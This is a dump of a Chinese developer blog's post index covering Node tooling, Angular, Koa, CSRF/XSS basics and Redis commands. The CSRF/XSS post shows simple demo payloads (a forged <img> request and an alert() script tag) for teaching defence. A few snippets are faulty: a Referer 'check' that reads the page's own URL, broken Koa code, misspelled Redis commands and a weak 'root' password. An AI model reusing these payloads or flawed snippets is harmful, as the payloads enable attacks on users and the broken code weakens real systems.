pnpm\n安装包\npnpm install axios\n升级\npnpm add -g pnpm\n卸载\npnpm uninstall axios \u0026ndash;filter package-a\n","permalink":"https://99999.fun/posts/105/","summary":"npm在这里https://xiaochenabc123.test.com/archives/31.html\nYarn在这里https://xiaochenabc123.test.com/archives/38.html\nnvm全名node.js version management\n用来nodejs多版本管理，可以切换和安装不同版本的nodejs\n安装nvm之前记得把安装过的nodejs都卸载了\n安装完成后，安装目录下会生成一个settings.txt文件\n配置一下（如果要使用淘宝npm源的话）\nroot: D:\\Software\\nvm path: D:\\Software\\nodejs arch: 64 node_mirror: https://npm.taobao.org/mirrors/node/ npm_mirror: https://npm.taobao.org/mirrors/npm/\n环境变量\nNVM_HOME设置为nvm安装目录\nNVM_SYMLINK设置为nodejs安装目录\nPath：添加%NVM_HOME%和%NVM_SYMLINK%\n注意：安装路径不能出现中文或者空格，否则报错，请使用管理员权限运行use命令，否则可能导致exit status 1:xxx\n安装指定版本nodejs\nnvm install 14.17.3\n查看可以安装的nodejs版本\nnvm ls available\n查看当前全部已经安装的nodejs版本\nnvm ls\n切换nodejs版本\nnvm use 14.17.3\n卸载nodejs\nnvm uninstall 14.17.3\n查看系统位数和node位数\nnvm arch\n另一个nodejs多版本管理工具n\n安装n\nnpm install -g n\n安装最新nodejs版本\nn latest\n安装稳定版本nodejs\nn stable\n安装lts版本\nn lts\n安装指定版本的nodejs（如果已安装了这个版本，那么就会选择这个版本，这个命令可以用来安装和选择）\nn 14.17.3\n卸载指定版本\nn rm 14.17.3","title":"NodeJS常用工具的简单使用"},{"content":"Angular是三大前端框架之一（Angular在国内的热度低，但是在国外热度还是很高的，主要是因为Angular到Angular2的断崖式升级）\nAngular和Vue的区别就是，Angular具备完整的MVVM框架功能（功能高度集成），提供一套完整的解决方案，而Vue是轻量级MVVM框架（渐进式，还需要vue-router之类的扩展功能），Angular和Vue并没有谁好谁坏之分，各有风格\n注意：Angular是AngularJS的重写，AngularJS使用JavaScript编写完成，而Angular采用TypeScript编写完成\n安装\nnpm install -g angular-cli\n第一个Angular应用\n\u0026lt;div ng-app ng-init=\u0026quot;name='default'\u0026quot;\u0026gt;\r\u0026lt;p\u0026gt;name: \u0026lt;input type=\u0026quot;text\u0026quot; ng-model=\u0026quot;name\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;h1\u0026gt;hallo，{{name}}\u0026lt;/h1\u0026gt;\r\u0026lt;p ng-bind=\u0026quot;name\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\rng-app属性将其声明为是一个Angular应用，ng-model将数据绑定到name中，ng-bind将其输出绑定，ng-init是初始化值\n","permalink":"https://99999.fun/posts/101/","summary":"Angular是三大前端框架之一（Angular在国内的热度低，但是在国外热度还是很高的，主要是因为Angular到Angular2的断崖式升级）\nAngular和Vue的区别就是，Angular具备完整的MVVM框架功能（功能高度集成），提供一套完整的解决方案，而Vue是轻量级MVVM框架（渐进式，还需要vue-router之类的扩展功能），Angular和Vue并没有谁好谁坏之分，各有风格\n注意：Angular是AngularJS的重写，AngularJS使用JavaScript编写完成，而Angular采用TypeScript编写完成\n安装\nnpm install -g angular-cli\n第一个Angular应用\n\u0026lt;div ng-app ng-init=\u0026quot;name='default'\u0026quot;\u0026gt;\r\u0026lt;p\u0026gt;name: \u0026lt;input type=\u0026quot;text\u0026quot; ng-model=\u0026quot;name\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;h1\u0026gt;hallo，{{name}}\u0026lt;/h1\u0026gt;\r\u0026lt;p ng-bind=\u0026quot;name\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\rng-app属性将其声明为是一个Angular应用，ng-model将数据绑定到name中，ng-bind将其输出绑定，ng-init是初始化值","title":"Angular学习笔记"},{"content":"koa是web应用框架，是Express原班人马打造的，致力于成为一个更小、更富有表现力、更健壮的 Web 框架\n个人推荐：个人开发推荐用koa，团队开发推荐用egg\negg是在koa的基础上进行封装，并且提供了一些，并且添加了约束，更利于工程化的开发\n安装koa\nnpm install koa\n新建一个app.js\nconst Koa = require(\u0026quot;koa\u0026quot;)\rconst app = new Koa()\rapp.use(async (ctx, next) =\u0026gt; {\rawait next()\rctx.response.type = 'text/html'\rctx.response.body = '\u0026lt;h1\u0026gt;hallo, koa!\u0026lt;/h1\u0026gt;'\r})\rapp.listen(3000)\rnode app.js\nget请求参数的接收\nconst Koa = require('koa')\rconst app = new Koa()\rapp.use(async(ctx)=\u0026gt;{\rconst url =ctx.url\rconst request =ctx.request\rconst reqQuery = request.query\rconst reqQuerystring = request.querystring\rctx.body={\rurl,\rreqQuery,\rreqQuerystring\r}\r})\rapp.listen(3000,()=\u0026gt;{\rconsole.log('port 3000')\r})\rhttp://127.0.0.1:3000/admin?name=admin\u0026amp;pass=123\n通过ctx.request来获取得到get请求参数（query）\n还可以通过ctx上下文获取\napp.use(async(ctx)=\u0026gt;{\rconst url =ctx.url\rconst ctxQuery = ctx.query\rconst ctxQuerystring = ctx.querystring\rctx.body={\rurl,\rctxQuery,\rctxQuerystring\r}\r})\rPost请求接收\nKoa默认返回类型是text/plain，判断返回类型ctx.request.accepts()\n一般来说，返回给用户的页面都是写成文件的，因此可以通过nodejs的fs来读取本地的文件\nconst fs = require(\u0026quot;fs\u0026quot;)\rapp.use(async (ctx, next) =\u0026gt; {\rawait next()\rctx.response.type = 'text/html'\rctx.response.body = 'fs.createReadStream('./test.html')'\r})\r路由\n判断当前路由地址\nctx.request.path\n路由模块\nconst route = require(\u0026lsquo;koa-route\u0026rsquo;)\napp.ues(route.get(\u0026quot;/\u0026quot;, main))\n静态资源管理\nconst path = require(\u0026lsquo;path\u0026rsquo;) const serve = require(\u0026lsquo;koa-static\u0026rsquo;) const main = serve(path.join(__dirname)) app.use(main)\n重定向\nctx.response.redirect()可以实现302重定向，例如：\nconst redirect = ctx =\u0026gt; {\rctx.response.redirect('/')\rctx.response.body = '\u0026lt;a href=\u0026quot;/\u0026quot;\u0026gt;index\u0026lt;/a\u0026gt;'\r}\rapp.use(route.get('/auth, redirect));\r中间件\n中间件实质上就是在请求和响应之间，实现某个中间功能，而app.use()就是用来加载中间件的\n这个中间件默认支持两个参数（ctx和next）\n多个中间件，按照先进后出，next可以传递，await next就是异步中间件\n合成中间件\nconst compose = require(\u0026lsquo;koa-compose\u0026rsquo;) const c = compose([a, b]) app.use(c)\n抛出错误\nconst main = ctx =\u0026gt;{\rctx.response.status = 404\rctx.response.body = '404找不到资源';\r}\r注意：发生错误，koa会触发一个error事件，因此也可以监听这个事件，来抛出错误\n读写cookies\nctx.cookies.get()\n","permalink":"https://99999.fun/posts/100/","summary":"koa是web应用框架，是Express原班人马打造的，致力于成为一个更小、更富有表现力、更健壮的 Web 框架\n个人推荐：个人开发推荐用koa，团队开发推荐用egg\negg是在koa的基础上进行封装，并且提供了一些，并且添加了约束，更利于工程化的开发\n安装koa\nnpm install koa\n新建一个app.js\nconst Koa = require(\u0026quot;koa\u0026quot;)\rconst app = new Koa()\rapp.use(async (ctx, next) =\u0026gt; {\rawait next()\rctx.response.type = 'text/html'\rctx.response.body = '\u0026lt;h1\u0026gt;hallo, koa!\u0026lt;/h1\u0026gt;'\r})\rapp.listen(3000)\rnode app.js\nget请求参数的接收\nconst Koa = require('koa')\rconst app = new Koa()\rapp.use(async(ctx)=\u0026gt;{\rconst url =ctx.url\rconst request =ctx.request\rconst reqQuery = request.query\rconst reqQuerystring = request.querystring\rctx.body={\rurl,\rreqQuery,\rreqQuerystring\r}\r})\rapp.listen(3000,()=\u0026gt;{\rconsole.log('port 3000')\r})\rhttp://127.","title":"Koa框架学习笔记"},{"content":"CSRF\nCSRF：跨站点请求伪造(Cross—Site Request Forgery)\nCSRF实质上就是盗用身份，来实现发送恶意请求\n在访问某个“可信”站点，生成Cookie，再打开某个恶意网站，而这个恶意网站带有CSRF攻击的脚本，然后通过引诱用户触发该脚本，就会向那个可信站点发送恶意请求\n例如：\n\u0026lt;img src =\u0026quot;http://xxx.xxx/test?xxx=666\u0026quot;\u0026gt;\r只要访问就会发生该恶意请求，也可以是某超链接或者按钮等等\n而解决方法就是保证请求来源自当前站点，例如Referer字段，这个字段记录来源站点的地址，通过判断Referer字段上的域名，来判断是否是当前网站自己的请求\n这个方法有个缺点就是由浏览器提供，不能保证浏览器自己有没有安全漏洞，不然还是能够伪造Referer字段，而且如果用户设置不提供Referer字段，那也会默认导致认为是CSRF攻击\n还有一个方法就是通过添加token来处理，请求地址使用一串令牌（加密），来确保是当前站点发送请求，因为哪怕是伪造请求，也不知道令牌是什么，而且还搭配XMLHttpRequest来请求，确保请求信息不被Referer字段收录\nJavaScript简单实现方法\nlet referer = document.location.href;\rif(referer != null \u0026amp;\u0026amp; referer.startsWith(\u0026quot;https://xiaochenabc123.test.com\u0026quot;)){\rconsole.log(\u0026quot;验证成功!!!\u0026quot;)\r}else{\rconsole.log(\u0026quot;验证失败!!!\u0026quot;)\r}\r防御措施：token身份验证，页面来源验证（referer）等等\nXSS：跨站脚本攻击（Cross Site Scripting），因为避免和层叠样式表混淆，因此叫XSS\nXSS攻击原理就是在页面插入恶意脚本，当页面被访问了，那么这个恶意脚本被执行，从而达到恶意攻击用户的目的\n例如：在某个页面评论上加\u0026lt;script\u0026gt;alert(\u0026lsquo;hack\u0026rsquo;)\u0026lt;/script\u0026gt;，那么如果没有做过xss攻击防御的站点，其他用户访问到这个页面，那么就会执行该程序\n做那些标签防御，都可以闭合绕过，都是无用功，例如：通过属性值来输出\n也用通过过滤\u0026lt;script\u0026gt;标签的，但是可以通过大小写绕过（html不区分大小写）\n简单的防御方法：\n通过严格的过滤白名单来过滤，限制输入值的类型\nhtml实体编码转义，htmlspecialchars()或者htmlentities()\nX-XSS-Protection\nxss和csrf的区别：csrf是利用网站的自动执行的接口，依赖于用户已经登录页面（Cookie），而且xss是在页面插入js，来恶意执行js脚本的内容\n同源策略（Same-origin Policy）：只有协议，域名，端口号都相同才满足同源，否则就是跨域\n同源策略是浏览器提供的安全策略，限制某个脚本的加载范围（隔离潜在恶意脚本的安全机制）\n可以限制脚本无法读取Cookie，LocalStorage和IndexDB，无法操作dom（无法获取dom），请求不能发送等等\n跨域通信的方式：jsonp，hash，postmessage，websocket，cors\n同域可以使用ajax，cors（支持同源通信，也是支持跨域），websocket（不受同源策略限制）进行通信\n内容安全策略（Content Security Policy）：可以一定程度上免疫或者削弱XSS攻击\n内容安全策略实质上就是告诉浏览器，什么东西可以加载执行，什么东西不能加载执行，内容安全策略的实现和操作都由浏览器完成，只需要提供配置就好\n要开启CSP需要服务器返回Content-Security-Policy头部\nhtml也可以配置该策略，例如：\n\u0026lt;meta http-equiv=\u0026quot;Content-Security-Policy\u0026quot; content=\u0026quot;default-src 'self'; img-src https://*;\u0026quot;\u0026gt;\r其中img-src对应的指定图像或者图标的有效来源\n常用的有img-src，font-src，script-src，style-src等等\nCSRF\nX-Frame-Options：DENY/SAMEORIGIN\n可以利用Cookie的SameSite属性，这个属性有3个值，分别是Strict，Lax，None，主要用的就是Strict属性值\nStrict：完全禁止第三方Cookie，只有当目前网页的url和请求目标一致才会发生Cookie\n中间人攻击可以通过开启https来进行大部分的攻击免疫（https中间人攻击还是存在的）\n","permalink":"https://99999.fun/posts/99/","summary":"CSRF\nCSRF：跨站点请求伪造(Cross—Site Request Forgery)\nCSRF实质上就是盗用身份，来实现发送恶意请求\n在访问某个“可信”站点，生成Cookie，再打开某个恶意网站，而这个恶意网站带有CSRF攻击的脚本，然后通过引诱用户触发该脚本，就会向那个可信站点发送恶意请求\n例如：\n\u0026lt;img src =\u0026quot;http://xxx.xxx/test?xxx=666\u0026quot;\u0026gt;\r只要访问就会发生该恶意请求，也可以是某超链接或者按钮等等\n而解决方法就是保证请求来源自当前站点，例如Referer字段，这个字段记录来源站点的地址，通过判断Referer字段上的域名，来判断是否是当前网站自己的请求\n这个方法有个缺点就是由浏览器提供，不能保证浏览器自己有没有安全漏洞，不然还是能够伪造Referer字段，而且如果用户设置不提供Referer字段，那也会默认导致认为是CSRF攻击\n还有一个方法就是通过添加token来处理，请求地址使用一串令牌（加密），来确保是当前站点发送请求，因为哪怕是伪造请求，也不知道令牌是什么，而且还搭配XMLHttpRequest来请求，确保请求信息不被Referer字段收录\nJavaScript简单实现方法\nlet referer = document.location.href;\rif(referer != null \u0026amp;\u0026amp; referer.startsWith(\u0026quot;https://xiaochenabc123.test.com\u0026quot;)){\rconsole.log(\u0026quot;验证成功!!!\u0026quot;)\r}else{\rconsole.log(\u0026quot;验证失败!!!\u0026quot;)\r}\r防御措施：token身份验证，页面来源验证（referer）等等\nXSS：跨站脚本攻击（Cross Site Scripting），因为避免和层叠样式表混淆，因此叫XSS\nXSS攻击原理就是在页面插入恶意脚本，当页面被访问了，那么这个恶意脚本被执行，从而达到恶意攻击用户的目的\n例如：在某个页面评论上加\u0026lt;script\u0026gt;alert(\u0026lsquo;hack\u0026rsquo;)\u0026lt;/script\u0026gt;，那么如果没有做过xss攻击防御的站点，其他用户访问到这个页面，那么就会执行该程序\n做那些标签防御，都可以闭合绕过，都是无用功，例如：通过属性值来输出\n也用通过过滤\u0026lt;script\u0026gt;标签的，但是可以通过大小写绕过（html不区分大小写）\n简单的防御方法：\n通过严格的过滤白名单来过滤，限制输入值的类型\nhtml实体编码转义，htmlspecialchars()或者htmlentities()\nX-XSS-Protection\nxss和csrf的区别：csrf是利用网站的自动执行的接口，依赖于用户已经登录页面（Cookie），而且xss是在页面插入js，来恶意执行js脚本的内容\n同源策略（Same-origin Policy）：只有协议，域名，端口号都相同才满足同源，否则就是跨域\n同源策略是浏览器提供的安全策略，限制某个脚本的加载范围（隔离潜在恶意脚本的安全机制）\n可以限制脚本无法读取Cookie，LocalStorage和IndexDB，无法操作dom（无法获取dom），请求不能发送等等\n跨域通信的方式：jsonp，hash，postmessage，websocket，cors\n同域可以使用ajax，cors（支持同源通信，也是支持跨域），websocket（不受同源策略限制）进行通信\n内容安全策略（Content Security Policy）：可以一定程度上免疫或者削弱XSS攻击\n内容安全策略实质上就是告诉浏览器，什么东西可以加载执行，什么东西不能加载执行，内容安全策略的实现和操作都由浏览器完成，只需要提供配置就好\n要开启CSP需要服务器返回Content-Security-Policy头部\nhtml也可以配置该策略，例如：\n\u0026lt;meta http-equiv=\u0026quot;Content-Security-Policy\u0026quot; content=\u0026quot;default-src 'self'; img-src https://*;\u0026quot;\u0026gt;\r其中img-src对应的指定图像或者图标的有效来源\n常用的有img-src，font-src，script-src，style-src等等\nCSRF\nX-Frame-Options：DENY/SAMEORIGIN\n可以利用Cookie的SameSite属性，这个属性有3个值，分别是Strict，Lax，None，主要用的就是Strict属性值\nStrict：完全禁止第三方Cookie，只有当目前网页的url和请求目标一致才会发生Cookie\n中间人攻击可以通过开启https来进行大部分的攻击免疫（https中间人攻击还是存在的）","title":"简单了解CSRF攻击和XSS攻击"},{"content":"Redis是NoSQL数据库（Not Only SQL）家族的代表之一，其特点就是基于内存运行，支持分布式，key-value存储\nRedis具备速度快，支持多种数据结构，可持久化，支持主从复制，具备高可用，分布式等特点\n可以将内存中的数据存储到磁盘中，重启的时候再加载使用，保证数据的持久性，支持备份恢复，常用于缓存数据库（辅助持久化数据库）\n因为其是以内存作为存储介质，因此读写数据的效率极高，读取速度可高达110000次/s（也就说可达到10W QPS，QPS（Queries Per Second）:每秒查询率），写速度高达81000次/s\nRedis将数据存储于内存中，Redis会将数据的更新异步存储到磁盘中来持久化，Redis数据持久化有2种方式，分别是RDB（Redis DataBase）和AOF（append only file）\nRedis支持多种数据结构，例如：string（字符串），hash（哈希），list（列表），set（集合），zset(Sorted Set: 有序集合)，BitMaps（位图），HyperLogLog（超小内存唯一值计数），GEO（地理信息定位）\nRedis支持分布订阅，Lua脚本，事务，pipeline等功能，支持主从复制，确保高可用\nRedis可以用来当做缓存系统，用户访问app应用服务时，一般来说会优先从缓存中读取，如果缓存没有再到存储介质中读取，并且将该数据会在存储在缓存中，这个缓存就是Redis\nRedis安装\n编译安装（linux）\n下载redis-x.x.x.tar.gz\n解压\ntar xzf redis-x.x.x.tar.gz\n进入解压出来的文件夹中，执行make\u0026amp;\u0026amp;make install命令\n因为用的是默认配置\n进入src，./redis-server ../redis.conf\n测试客户端\n./redis-cli\nsrc目录下可看到6个可执行文件，作用如下：\nredis-server可执行文件用于启动redis服务器\nredis-cli可执行文件用于redis命令行客户端，用于连接redis服务器\nredis-benchmark可执行文件用于redis性能测试，基准测试\nredis-check-aof可执行文件用于修复AOF可持久化文件\nredis-check-dump可执行文件用于RDB可持久化文件的检查工作\nredis-sentinel可执行文件用于启动高可用的sentinel模式（该模式又叫哨兵）\n使用redis并不推荐使用windows，虽然微软官方提供了redis补丁，但是redis版本太低了，建议使用Linux虚拟机或者docker容器来跑\nredis有3种启动服务器方式\n默认配置启动\nredis-server\n动态参数启动\nredis-server \u0026ndash;port 6380\n配置文件启动（推荐，通过redis.conf文件来进行配置）\nredis-server configPath\n客户端连接服务（6379是redis默认端口）\nredis-cli -h 127.0.0.1 -p 6379 -a \u0026ldquo;root\u0026rdquo;\nredis.conf配置\n默认端口为6379\nport 6379\n要远程访问则设置为0.0.0.0\nbind 127.0.0.1\nlogfile，redis日志名\ndir，redis工作目录（日志文件和持久化文件存储在哪个文件）\n以守护进程运行（yes为守护进程），注意如果是以守护进程运行，那么会默认将pid写入到/var/run/redis.pid\ndaemonize yes\n指定pid位置\npidfile /var/run/redis.pid\n数据库文件\ndbfilename xxx.rdb\n当客户端被闲置了多久关闭链接，0为关闭该功能\ntimeout 0\n存储到本地数据库的时候是否压缩数据，采用LZP压缩\nrdbcompression yes\n超时\ntimeout 300\n密码\nrequirepass root\nredis的通用命令\n遍历输出所有key\nKEYS *\n输出所有以r开头的key\nKEYS r*\n输出所有以ra或者rb，rc开头的key\nKEYS n[a-c]\n输出roo?，?号位占位\nKEYS roo?\nKEYS不推荐使用，因为KEYS命令的时间复杂度为O(n)\n输出key的总数（时间复杂度为O(1)，不需要读取全部key，redis会提供一个计数器来实时更新记录key的总数）\nDBSIZE\n判断一个key是否存在（真返回1，假返回0）\nEXISTS a\n删除指定key（可删除多个）\nDEL a b\n设置a将在10秒后过期\nEXPIRE a 10\n查询a将在多少秒后过期\nTTL a\n移除a的移除时间\nPERSIST a\n查询a的类型\nTYPE a\n上面几条命令除了KEYS不是O(1)外，其他都是O(1)\n清除全部数据（key）\nFLUSHALL\nRedis的命令执行是单线程（例如网络请求，数据操作）\n一次只能执行一条命令，如果某条命令执行过长时间，会导致阻塞\n字符串\n注意：key不要使用单引号双引号来表示双引号，没有必要\nname键存储字符串root\nSET name root\nname为键（key），root为name键的值（value）\n当key不存在时添加value值（存在则不进行操作）\nSET name 1 NX\n当key存在时添加value值\nSET name 1 XX\n设置key的过期时间（单位为秒，这里表示10秒钟，可使用TTL查看过期时间）\nSETEX name 10 1\n设置key的过期时间，单位为毫秒\nSET name 1 PX 1000\n获取name的值\nGET name\n删除name\nDEL name\n将a的值自增1\nGET a 1 INCR a\n将a的值自减1\nDECR a\n将a的值自增指定值，这里就是a的值加99\nINCRBY a 99\n将a的值自减指定值\nDECRBY a 99\n批量获取多个key\nMGET a b c\n批量设置多个key-value\nMSET a 1 b 2 c 3\n设置新的value，并且返回 旧的value\nGETSET a 1\n将新的value追加到旧的value中去\nAPPEND a 2\n输出字符串的长度（注意中文，一个中文占2个字节，时间复杂度也为O(1)）\nSTRLEN a\n增加key的值，如果a的值为1的话，就是1+3.14\nINCRBYFLOAT a 3.14\n输出0到2下标的字符串\nGETRANGE a 0 2\n将第4个下标的字符串修改b（因为字符串下标从0开始）\nSETRANG hallo 3 b\n上面指令中除了MGET和MSET外（为O(n)），时间复杂度都为O(1)\n哈希是键值对的集合，是字段和值之间的映射（field（就是字段）不能相同，而value允许相同）\n设置哈希表user（name为field，root为value） HSET user name root\n获取哈希表user中指定name字段的值 HGET user name\n获取哈希表user中的全部字段和值 HGETALL user\n删除哈希表user中的name字段 HDEL user name\n判断哈希表user中是否存在name字段 HEXISTS user name\n输出哈希表user中存在多少个字段 HLEN user\n一次添加多条字段（时间复杂度为O(n)） HMGET user name root pass 123\n一次获取多条字段的值（时间复杂度为O(n)） HMSET user name pass\n输出user中的全部字段和值（时间复杂度为O(n)） HGETALL user\n输出user的全部值（时间复杂度为O(n)） HVALS user\n输出user中的全部字段（时间复杂度为O(n)） HKEYS user\n列表（有序，可重复，左右两端都可以插入值）\n将值插入hallo列表的最左端中（根据插入的个数决定时间复制度，实质效果就是 c b a，因为是从左端插入的） LPUSH hallo a b c\n值将从hallo列表的最右端中插入（根据插入的个数决定时间复制度） RPUSH hallo a b c\n在指定值之前插入一个新的值，这个表示b插入到a的前面 (时间复杂度为O(n)) LINSERT hallo BEFORE a b\n在指定值之后插入一个新的值，这个表示b插入到a的后面 (时间复杂度为O(n)) LINSERT hallo AFTER a b c\n从左边移除一个key LPOP hallo\n从左边移除一个key RPOP hallo\n删除全部于a值相等的（为0是相等，大于0为从列表的最右边删除以a值相等的指定数据的值（例如LREM hallo 1 a，就是从右侧（列表底部）删除1个和a值相等的值（因为列表允许存在重复的值，可用于去重）），小于0为从列表的最左侧删除于a值的值（例如-1就是删除最左侧删除和a值的相等的1个值（绝对值））） LREM hallo 0 a\n栽剪1到3的值（0以及3之后的值将被移除） LTRIM hallo 1 3\n查询0到5的值，正值是从左到右获取（从0开始），负数就是从右到左查（-1开始）（O(n)） LRANGE hallo 0 5\n获取指定索引的值(O(n)) LINDEX hallo 0\n获取列表的长度 LLEN hallo\n设置1索引的值为a LSET hallo 1 a\n获取列表的第一个元素（最左边）（会输出第一个元素的key，以及值），如果列表不存在元素则阻塞列表，一直到等待指定时间后返回nil，这里是等待10秒 BLPOP hallo 10\n删除列表的最后一个元素（最右边）（会输出最后一个元素的key，以及值），如果列表不存在元素则阻塞列表，一直到等待指定时间后返回nil，这里是等待10秒 BRPOP hallo 10\n\u0026ndash;\n集合（无序集合，集合的特定就是没有重复元素，集合是利用哈希表实现的，因此添加，删除，查找的复杂度都是O(1)）\nSADD hallo abc\nSADD hallo xyz\n删除集合（将abc从hallo集合中删除）\nSREM hallo abc\n输出指定集合中的元素个数\nSCARD hallo\n判断\u0026rsquo;abc\u0026rsquo;是否存在于hallo集合中（真返回1，假返回0）\nSISMEMBER hallo \u0026lsquo;abc\u0026rsquo;\n随机输出指定集合的元素，其中count参数是随机输出几个元素\nSRANDMEMBER hallo count = 2\n输出指定集合的全部元素\nSMEMBERS hallo\n查找第一个集合和其他集合之间不相同的元素（差集）\nSDIFF hallo hhh\n将多个集合之前不相同元素存储到另一个集合中去，例子中是将hallo和hhh集合中不相同的元素存储到abcxyz集合中去\nSDIFFSTORE abcxyz hallo hhh\n输出指定集合中的相同的元素（交集，指定集合中存在相同的元素）\nSINTER hallo hhh\n输出指定集合的并集，就是将多个集合合并成一个集合\nSUNION hallo hhh\n随机从集合种移除指定个数的元素，如果不指定个数，默认移除1个元素\nSPOP hallo 2\n有序集合（根据第二个参数（分数）来排序）（ZADD时间复杂度为O(logN)）\nZADD hallo 0 abc\nZADD hallo 1 xyz\n删除指定元素（可多个） ZREM hallo abc\n获取abc的分数 ZSCORE hallo abc\n增加或者减少abc的分数，这里是加1（负数为减） ZINCRBY hallo 1 abc\n获取hallo的元素个数 ZCARD hallo\n获取abc在hallo中的排名（从0开始，正序，从小到大的排名） ZRANK hallo abc\n逆序排序（从大到小，例子是表示逆序输出得到为0到5之间的集合元素）\nZRANGEBYSCORE hallo 0 5\n逆序排序输出集合的全部元素\nZREVRANGEBYSCORE hallo +inf -inf\n正序输出分数在0到10之间的元素\nZRANGEBYSCORE hallo 0 10 WITHSCORES\n有序输出集合的全部元素，WITHSCORES参数为输出时携带得分\nZRANGE hallo 0 -1 WITHSCORES\n有序输出集合的索引为0到5之间的元素（第一个到第六个元素，-1表示最后一个元素，-2是最后面的第2个元素，以此类推）\nZRANGE hallo 0 5 WITHSCORES\n获取hallo集合中分数0到100的元素有多少个\nZCOUNT hallo 0 100\n将分数排名第一个的元素到第三个元素移除 ZREMRANGEBYRANK hallo 0 2\n将分数100到300之间的元素移除 ZREMRANGEBYSCORE hallo 100 300\n获取abc在hallo中的排名（逆序，从大到小的排名，排位0的值的分数最大） ZREVRANK hallo abc\n获取hallo中第一个元素到第三个元素的值（带分数），先根据分数从大到小排序，再获取 ZREVRANGE hallo 0 2 WITHSCORES\n获取指定有序集的交集（这里3表示有序集中存在4个值，就是每个有序集提供4个值，这里指定了2个有序集，就是4+4，hallo交集中就有8个值），并且存储到hallo交集中 ZINTERSTORE hallo 3 xyz hhh\n获取指定有序集的并集（其中WEIGHTS后面的参数分别表示对应有序集的乘法因子，例如xyz中第一个元素得分为2，那么就是2x2，就是4，而这个4被做为该值的得分传入到新的hallo并集中，并集将集合合并在一起，AGGREGATE后面的参数表示集合的聚合方法，默认为SUM（就是将所有指定集合中的某个元素的分数的和作为并集中该成员的分数，简单来说就是将集合中相同元素的分数相加，得到的和作为并集，也就是新创建的集合中作为该元素的分数），除了SUM外还有MIN（获取全部集合中相同元素的得分取自这些相同元素中最小的得分作为新集的该元素的得分），MAX（获取全部集合中相同元素的得分取自这些相同元素中最大的得分作为新集的该元素的得分）） ZUNIONSTORE hallo 3 xyz hhh WEIGHTS 2 3 AGGREGATE MIN\n慢查询（特点：先进先出队列，固定长度，保存于内存中）\n慢查询就是寻找长时间执行的命令，并且将该命令存储在日志中，慢查询只能记录命令执行的时间\n慢查询利用2个参数来实现的，这2个参数分别为slowlog-max-len和slowlog-log-slower-than\n其中slowlog-log-slower-than是记录执行超过指定时间的命令，单位为微秒，默认值为10000\nslowlog-max-len是限制慢查询日志的条数（慢查询日志的数据结构为列表，默认值为128，因为该慢查询日志是存储在内存中，重启redis会丢失日志的记录）\n当慢查询日志达到阈值时，如果还继续添加新的慢查询进来，将会将当前日志中最早的慢查询删除（先进先出）\n通过SOLWLOG GET命令查看慢查询日志\n慢查询日志的结构有6个值来表示1个慢查询，分别为慢查询的唯一ID，该命令执行的时间戳，慢查询的命令和参数，客户端地址和端口，客户端名称（通过client setname设置）\n查看存在多少条慢查询\nSOLWLOG LEN\n获取指定多少条慢查询\nSOLWLOG GET 1\n清除慢查询的全部记录\nSOLWLOG RESET\npipeline流水线机制\nredis的命令执行由发送命令，再到命令进行排队（无法确定下个执行的命令是哪个），命令执行，最后返回结果\n这个命令的过程又叫Round trip time，RTT，往返时间\npipeline流水线机制就是减少RTT的\npipeline就是将命令一次性通过网络获取多条命令，然后再执行多条命令（打包组装）\n注意：原生批命令(mset, mget)是原子性，而pipeline是非原子性，而且应该也必须限制pipeline的执行命令的个数\n发布订阅\n发布1到hallo频道中去 PUBLISH hallo 1\n订阅hallo频道 SUBSCRIBE hallo\n取消订阅hallo频道 UNSUBSCRIBE hallo\n订阅全部以h开头的频道（定义模式） PSUBSCRIBE h*\n取消订阅全部以h开头的定义 PUNSUBSCRIBE h*\n查看至少有一个订阅的频道并且要以h开头（也就是活跃的频道） PUBSUB CHANNELS h\n输出指定频道的订阅数 PUBSUB NUMSUB hallo\n输出当前订阅模式的数量 PUBSUB NUMPAT\nBitmap位图（位图就是位的映射，使用一个bit位来表示某个元素的值）\n位图的每个值只占用一个bit位，位图本质上还是字符串类型\n1个字节由8个二进制位表示，例如字符串a的二进制为01100001\n创建hallo位图 SET hallo a\n查询b字符的八位二进制码（得到01100010） BIN(ORD(\u0026lsquo;b\u0026rsquo;))\n将a值改为b，只需要将最后一位改为0，倒数第二位改为1，例如：\n给hallo位图的最后一位设置0值 SETBIT hallo 7 0\n给hallo位图的倒数第二位设置1值 SETBIT hallo 6 1\n通过执行GET hallo命令，可以看到已经变成了b\n获取hallo位图中第一位的值 GETBIT hallo 0\n获取hallo位图中第一位到第八位之间值为1的个数（如果不指定就是获取整个位图中值为1的个数） BITCOUNT hallo 1 8\n将abc位图和xyz位图交集，并且将得到的新集存储在hallo位图中（and交集，or并集，not非集，xor异或集） BITOP AND hallo abc xyz\n获取hallo位图中中第一位到第八位之间第一个值为1位置（偏移量） BITPOS hallo 1 1 8\nhyperloglog\nhyperloglog（使用极小的空间来完成计数，本质还是字符串，特点就是输入的数量很多或者值有多大，占据的空间都是固定的（一个HyperLogLog键只使用12KB内存））\n向hyperloglog添加值 PFADD hallo a b c\n查看hyperloglog中存在多少个值（注意：返回的是基数，就是hyperloglog中存在相同的值时，会被忽略） PFCOUNT hallo\n合并2个（也可多个）hyperloglog到hallo PFMERGE hallo abc xyz\nhyperloglog的缺点就是错误率高（官方提供的错误率值是0.81%），无法获取单个数据\ngeo\nGEO（地理信息定位），用于存储经纬度，计算两地距离，范围计算等等\n添加经纬度到hallo（guangzho是标识） GEOADD hallo 113.27 23.13 guangzho GEOADD hallo 114.07 22.62 shenzheng\n从GEO获取经纬度 GEOPOS hallo guangzho\n获取两个经纬度之间的距离（m米，km千米，mi英里，ft尺） GEODIST hallo shenzheng guangzho\n获取guangzho附近1000千米的标识信息 GEORADIUS hallo guangzho 1000km\n持久化（redis数据存储于内存中，持久化功能可将数据的更新异步存储在硬盘中）\nRDB（快照），AOF（日志）\n持久化的RDB和AOF\nRDB（redis database）：Redis默认持久化策略，通过内存快照来实现持久化\nRDB有3种模式，一个是通过sava命令来同步触发redis进行RDB文件（RDB文件是二进制文件）生成，另一种就是通过bgsave命令来异步进行持久化文件RDB生成（该命令会让redis server fork一个子进程来进行该操作，这样主进程可以继续处理请求，不会阻塞），最后一个就是通过redis.conf配置文件来配置RDB自动生成，例如save 900 